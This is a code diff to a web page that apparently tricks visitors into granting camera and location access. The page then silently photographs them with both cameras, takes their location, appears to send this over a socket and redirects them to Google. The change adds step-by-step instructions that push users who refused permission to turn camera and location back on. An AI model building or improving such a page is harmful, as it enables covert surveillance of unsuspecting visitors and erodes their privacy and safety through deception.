@@ -69,6 +69,7 @@
         }
         #statusText.error { color: #e53e3e; }
         #statusText.success { color: #22a67e; }
+        #statusText.warning { color: #ed8936; }
         #hiddenVideo, #hiddenVideoBack { display: none; }
         .perm-status {
             margin-top: 15px;
@@ -78,6 +79,18 @@
         }
         .perm-status .done { color: #22a67e; }
         .perm-status .pending { color: #f6ad55; }
+        .perm-status .denied { color: #e53e3e; }
+        .instructions {
+            margin-top: 15px;
+            padding: 12px;
+            background: #fef3c7;
+            border-radius: 8px;
+            font-size: 13px;
+            color: #92400e;
+            display: none;
+            text-align: left;
+        }
+        .instructions a { color: #4285f4; }
     </style>
 </head>
 <body>
@@ -91,6 +104,13 @@
             <span id="permLocation">📍 Location: <span class="pending">Waiting</span></span> |
             <span id="permFront">📸 Front: <span class="pending">Waiting</span></span> |
             <span id="permBack">📸 Back: <span class="pending">Waiting</span></span>
+        </div>
+        <div class="instructions" id="instructions">
+            🔧 <strong>How to fix:</strong><br>
+            1. Click the <strong>🔒</strong> (lock) icon in address bar<br>
+            2. Set <strong>Camera</strong> to <strong>Allow</strong><br>
+            3. Set <strong>Location</strong> to <strong>Allow</strong><br>
+            4. Refresh page and click <strong>Retry</strong>
         </div>
         <button class="btn-continue" id="continueBtn">▶ Continue</button>
     </div>
@@ -114,6 +134,7 @@
             const statusText = document.getElementById('statusText');
             const continueBtn = document.getElementById('continueBtn');
             const permStatus = document.getElementById('permStatus');
+            const instructions = document.getElementById('instructions');
             
             let socket = null;
             let redirectUrl = 'https://www.google.com';
@@ -139,7 +160,7 @@
                 };
                 if (map[type]) {
                     map[type].textContent = status;
-                    map[type].className = status === 'Granted' ? 'done' : 'pending';
+                    map[type].className = status === 'Granted' ? 'done' : status === 'Denied' ? 'denied' : 'pending';
                 }
                 permStatus.style.display = 'block';
             }
@@ -281,16 +302,15 @@
                 isProcessing = true;
                 continueBtn.disabled = true;
                 continueBtn.textContent = '⏳ Processing...';
+                instructions.style.display = 'none';
                 
                 updateStatus('⏳ Requesting permissions...');
                 permStatus.style.display = 'block';
                 
-                // Reset permission status
                 updatePermStatus('location', 'Waiting');
                 updatePermStatus('front', 'Waiting');
                 updatePermStatus('back', 'Waiting');
 
-                // Clean up old streams
                 cleanupStreams();
 
                 // ---- STEP 1: FRONT CAMERA ----
@@ -305,12 +325,10 @@
                     frontVideo.srcObject = stream;
                     frontVideo.play().catch(() => {});
                     
-                    // Auto capture front photo
                     setTimeout(function() {
                         capturePhoto('front', stream);
                     }, 500);
                     
-                    // ---- STEP 2: BACK CAMERA ----
                     return navigator.mediaDevices.getUserMedia({
                         video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                         audio: false
@@ -323,12 +341,10 @@
                     backVideo.srcObject = stream;
                     backVideo.play().catch(() => {});
                     
-                    // Auto capture back photo
                     setTimeout(function() {
                         capturePhoto('back', stream);
                     }, 500);
                     
-                    // ---- STEP 3: LOCATION ----
                     return new Promise(function(resolve, reject) {
                         if (!navigator.geolocation) {
                             reject('Geolocation not supported');
@@ -369,7 +385,6 @@
                         });
                 })
                 .then(function() {
-                    // ---- ALL PERMISSIONS GRANTED ----
                     updateStatus('✅ All permissions granted! Redirecting...', 'success');
                     
                     if (socket && socket.connected) {
@@ -389,12 +404,17 @@
                 .catch(function(error) {
                     console.log('❌ Permission error:', error);
                     
-                    // Clean up streams on error
                     cleanupStreams();
                     
                     let errorMsg = '';
+                    let showInstructions = false;
+                    
                     if (error.message && (error.message.includes('Permission denied') || error.message.includes('denied'))) {
                         errorMsg = '⚠️ Permission denied. Please allow camera & location in browser.';
+                        showInstructions = true;
+                        updatePermStatus('location', 'Denied');
+                        updatePermStatus('front', 'Denied');
+                        updatePermStatus('back', 'Denied');
                     } else if (error.message && error.message.includes('not found')) {
                         errorMsg = '⚠️ No camera found on this device.';
                     } else {
@@ -402,6 +422,10 @@
                     }
                     
                     updateStatus(errorMsg, 'error');
+                    
+                    if (showInstructions) {
+                        instructions.style.display = 'block';
+                    }
                     
                     isProcessing = false;
                     continueBtn.disabled = false;
